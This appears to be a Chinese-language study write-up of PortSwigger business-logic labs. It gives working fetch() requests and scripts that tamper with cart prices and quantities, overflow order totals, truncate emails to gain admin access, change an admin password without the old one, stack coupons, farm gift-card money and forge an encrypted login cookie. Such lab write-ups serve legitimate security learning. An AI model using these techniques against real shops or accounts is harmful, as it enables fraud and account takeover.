---
title: Business logic vulnerabilities
description: Business logic vulnerabilities
last_update:
  date: "2025-10-15T08:00:00+08:00"
---

## Lab: Excessive trust in client-side controls

| Dimension | Description                                                                                                       |
| --------- | ----------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#excessive-trust-in-client-side-controls                 |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls |

加入購物車的時候沒檢查金額

```js
fetch(`${location.origin}/cart`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "productId=1&redir=PRODUCT&quantity=1&price=100",
  method: "POST",
  credentials: "include",
});
```

## Lab: High-level logic vulnerability

| Dimension | Description                                                                                       |
| --------- | ------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#excessive-trust-in-client-side-controls |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level              |

加入購物車的時候沒檢查數量，負數可以讓金額變成負的

```js
fetch(`${location.origin}/cart`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "productId=2&redir=PRODUCT&quantity=-26",
  method: "POST",
  credentials: "include",
});
```

## Lab: Low-level logic flaw

| Dimension | Description                                                                                       |
| --------- | ------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#excessive-trust-in-client-side-controls |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level               |

這題的 Hint

```
You will need to use Burp Intruder (or Turbo Intruder) to solve this lab.

To make sure the price increases in predictable increments, we recommend configuring your attack to only send one request at a time. In Burp Intruder, you can do this from the resource pool settings using the Maximum concurrent requests option.
```

根據線索，立馬想到是 Integer overflow，如果金額 > 2147483647 的話，也許就會變成負數，所以題目才說建議用 Burp Intruder 來解，並且要觀察價格的變化

這題我發現庫存有檢核 `quantity < 100`，於是我選擇用 JS 每次 80 來跑

```js
async function addToCart() {
  return fetch(`${location.origin}/cart`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: "productId=1&redir=PRODUCT&quantity=80",
    method: "POST",
    credentials: "include",
    redirect: "manual",
  });
}
```

| UnitPrice | Quantity | TotalPrice    |
| --------- | -------- | ------------- |
| $1337.00  | 16061    | $21473557.00  |
| $1337.00  | 16062    | -$21474778.96 |
| $1337.00  | 32124    | $115.04       |

但我們的金額只有 $100，所以稍微調整一下購物車，購買其他品項，成功壓在 $100 元以內～

## Lab: Inconsistent handling of exceptional input

| Dimension | Description                                                                                                          |
| --------- | -------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#excessive-trust-in-client-side-controls                    |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input |

這題有一些線索

- If you work for DontWannaCry, please use your @dontwannacry.com email address
- Displaying all emails @exploit-0a8800ef0328a813843a053a01ca0071.exploit-server.net and all subdomains

結合以上，我構造了 `xxx@dontwannacry.com.exploit-0a8800ef0328a813843a053a01ca0071.exploit-server.net` 的 email，但還是沒有取得 Admin panel 的權限

同時，我也嘗試用 username = `administrator` 來註冊，但是會顯示 `An account already exists with that username`

後來參考答案後，我才意識到我差了臨門一角～

這題利用的是長度 255 會被截斷的特性

構造

```js
Array(255 - "@dontwannacry.com".length)
  .fill(1)
  .join("") +
  "@dontwannacry.com.exploit-0a8800ef0328a813843a053a01ca0071.exploit-server.net";
```

可以成功收到註冊信，但是登入後，剛好會被截斷成 `111......111@dontwannacry.com`，然後就可以取得 Admin panel 權限了

這題的 Bypass 手法真的很妙，我從來沒想過可以這樣幹XDD

## Lab: Inconsistent security controls

| Dimension | Description                                                                                              |
| --------- | -------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#making-flawed-assumptions-about-user-behavior  |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls |

這題跟上一題一樣，都有註冊功能 + Email Client + @dontwannacry.com 可以訪問 Admin panel 的設定

先正常註冊，之後再 update email 改成 xxx@dontwannacry.com 就可以成功訪問 Admin panel～

## Lab: Weak isolation on dual-use endpoint

| Dimension | Description                                                                                                   |
| --------- | ------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#users-won-t-always-supply-mandatory-input           |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint |

這題有點神奇，直接拿掉 `current-password`，竟然就不檢核了，可以直接修改 `administrator` 的密碼

```js
fetch(`${location.origin}/my-account/change-password`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "csrf=OBWNVzxgoTDZXBYR13Z8wc3gUcXZBBK9&username=administrator&new-password-1=administrator&new-password-2=administrator",
  method: "POST",
  credentials: "include",
});
```

## Lab: Insufficient workflow validation

| Dimension | Description                                                                                                |
| --------- | ---------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#users-won-t-always-supply-mandatory-input        |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation |

先買一個 $100 以內的商品，觀察結帳流程，這題在結帳成功後，會 303 轉到 `/cart/order-confirmation?order-confirmed=true`

之後再把 $1337 的商品加入購物車，然後直接訪問上面的網址，就成功通關了～

## Lab: Authentication bypass via flawed state machine

| Dimension | Description                                                                                                              |
| --------- | ------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#users-won-t-always-supply-mandatory-input                      |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine |

這題登入後會 302 到 `/role-selector`，並且 GET 訪問該頁，會再回傳 `Set-Cookie: session=XaoJcQhdiqv6zs0QbxFM4DtZWifdops5; Secure; HttpOnly; SameSite=None`，但其實登入的時候就已經會 Set-Cookie 了，所以我們嘗試登入後不訪問 `/role-selector`

```js
fetch(`${location.origin}/login`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "csrf=4b6K80egvr3eWHeNzSpbUFUrYcqInOkH&username=wiener&password=peter",
  method: "POST",
  credentials: "include",
  redirect: "manual",
});
```

成功拿到 Admin panel 權限～

## Lab: Flawed enforcement of business rules

| Dimension | Description                                                                                                    |
| --------- | -------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#domain-specific-flaws                                |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules |

新戶禮：NEWCUST5
註冊禮：SIGNUP30

輪流使用的話，就可以無限的使用

| Name                              | Price     | Quantity |
| --------------------------------- | --------- | -------- |
| Lightweight "l33t" Leather Jacket | $1337.00  | 1        |
| SIGNUP30                          | -$401.10  |          |
| NEWCUST5                          | -$5.00    |          |
| SIGNUP30                          | -$401.10  |          |
| NEWCUST5                          | -$5.00    |          |
| SIGNUP30                          | -$401.10  |          |
| NEWCUST5                          | -$5.00    |          |
| SIGNUP30                          | -$401.10  |          |
| **Total**                         | **$0.00** |          |

## Lab: Infinite money logic flaw

| Dimension | Description                                                                              |
| --------- | ---------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#domain-specific-flaws          |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money |

這題我搞了好久，找不到 Gift cards 要怎麼兌換，後來看了 Solution 的第一步驟，瞬間恍然大悟，原來有個商品就叫做 Gift Card

$10 的 Gift Card 可以兌換 $10，但如果用 SUGNUP30 就可以打七折，算起來買一張就可以賺 $3，所以可以寫一個 JS 來刷錢

```js
function applyCoupon() {
  return fetch(`${location.origin}/cart/coupon`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: "csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX&coupon=SIGNUP30",
    method: "POST",
    credentials: "include",
    redirect: "manual",
  });
}
function addGiftCardsToCart(qty = 10) {
  return fetch(`${location.origin}/cart`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `productId=2&quantity=${qty}&redir=CART`,
    method: "POST",
    credentials: "include",
    redirect: "manual",
  });
}
function checkoutAndGetGiftCardCodes() {
  return fetch(`${location.origin}/cart/checkout`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: "csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX",
    method: "POST",
    credentials: "include",
  })
    .then((res) => res.text())
    .then((htmlText) => {
      const parser = new DOMParser();
      const doc = parser.parseFromString(htmlText, "text/html");
      const table = doc.querySelector("table.is-table-numbers");
      const rows = [...table.tBodies[0].rows];
      const codes = rows.map((row) => row.cells[0].innerText);
      const filteredCodes = codes.filter((code) => code !== "Code");
      return filteredCodes;
    });
}
function redeem(code) {
  return fetch(`${location.origin}/gift-card`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `csrf=5CSwsvtGPoukg8LShoI0MnK3Wc2xlDnX&gift-card=${code}`,
    method: "POST",
    credentials: "include",
    redirect: "manual",
  });
}
async function main() {
  const qty = 99;
  await addGiftCardsToCart(qty);
  await applyCoupon();
  const codes = await checkoutAndGetGiftCardCodes();
  const usableCodes = codes.slice(0, qty);
  console.log({ usableCodes });
  for (const code of usableCodes) {
    await redeem(code);
  }
  console.log("end");
}
```

用瀏覽器 JS 的好處是，有現成的 `DOMParser` 可以用，解析 htmlString 就不需要 regex，其實 python 的 beautifulSoup 跟 npm 的 Dompurify 也是同樣的概念吧（？都有類似 `HTMLParser` 或是 `DOMParser` 的概念

然後這題的 update email 功能，還有 Email Client 都是 "紅鯡魚謬誤"

## Lab: Authentication bypass via encryption oracle

| Dimension | Description                                                                                                           |
| --------- | --------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#providing-an-encryption-oracle                              |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle |

這題輸入錯誤的 email，會在 cookie 設定 notification

Invalid email address: 1 => ysLPLLvJF438cPQamdAP8FdK%2bskruZkjAdamzQGqzqA%3d

把 stay-logged-in: rZWe%2fD3rM7ewYxd744A6UeFy1D655dKtwnLESo2EiBg%3d 的 value 塞回 notification 後，得知格式為 `wiener:1760445014612`

嘗試把 notification 的 value by character 移除，應該會看到類似 input length must be a multiple of 16 的錯誤訊息

故嘗試填充到 32 的長度 Invalid email address: 456789012

Invalid email address: 456789012administrator:1760446048111
ysLPLLvJF438cPQamdAP8AaL/f331brhCpNccoDZWjmEcS+AQsP/hyhXKs8T2oSJ2FpBVFc/BdEpgvhzfaF9cQ==
CAC2CF2CBBC9178DFC70F41A99D00FF0068BFDFDF7D5BAE10A935C7280D95A3984712F8042C3FF8728572ACF13DA8489D85A4154573F05D12982F8737DA17D71

Invalid email address: 4567890121
ysLPLLvJF438cPQamdAP8AaL/f331brhCpNccoDZWjkJSrs/rqcbtwEe865pxb7D
CAC2CF2CBBC9178DFC70F41A99D00FF0068BFDFDF7D5BAE10A935C7280D95A39094ABB3FAEA71BB7011EF3AE69C5BEC3

Invalid email address: 4567890122
ysLPLLvJF438cPQamdAP8AaL/f331brhCpNccoDZWjkeEeltnyvl4G7WWk2E2TSi
CAC2CF2CBBC9178DFC70F41A99D00FF0068BFDFDF7D5BAE10A935C7280D95A391E11E96D9F2BE5E06ED65A4D84D934A2

CAC2CF2CBBC9178DFC70F41A99D00FF0068BFDFDF7D5BAE10A935C7280D95A39 => 移除一樣的部分，剛好是 64 個 HEX

84712F8042C3FF8728572ACF13DA8489D85A4154573F05D12982F8737DA17D71 => 把這個重新 Base64 Encode => hHEvgELD/4coVyrPE9qEidhaQVRXPwXRKYL4c32hfXE=

貼回 notification 驗證，確定解出來是 administrator:1760446048111，成功通關～

## Lab: Bypassing access controls using email address parsing discrepancies

| Dimension | Description                                                                                                                                   |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#email-address-parser-discrepancies                                                  |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies |

這題有說，建議先把 Gareth Heyes 的這篇文章 https://portswigger.net/research/splitting-the-email-atom 讀過，但我覺得這對現階段的我來說太困難了，這需要深入理解 email 的格式，以及各種 parser 的實作差異，我目前還是先以廣度為主，所以這題我就直接照著答案走一遍

<!-- todo-yus 未來要研究 -->

## 小結

這系列的 Labs，感覺都是跟著 Gareth Heyes 的 writeup，真希望有朝ㄧ日能變得跟他一樣強...撇除掉最後一題 email address parsing 真的超出我現況能理解的知識邊界，其餘的題目，解題的當下，都讓我有一種 "原來還有這種 Bypass 技巧，我怎麼一開始沒想到" 的驚嘆～我喜歡這種思考的過程，以及被題目的 Solution 突破思考盲點的當下，意識到自己的不足，也才會更有動力往前

## 參考資料

- https://portswigger.net/web-security/host-header
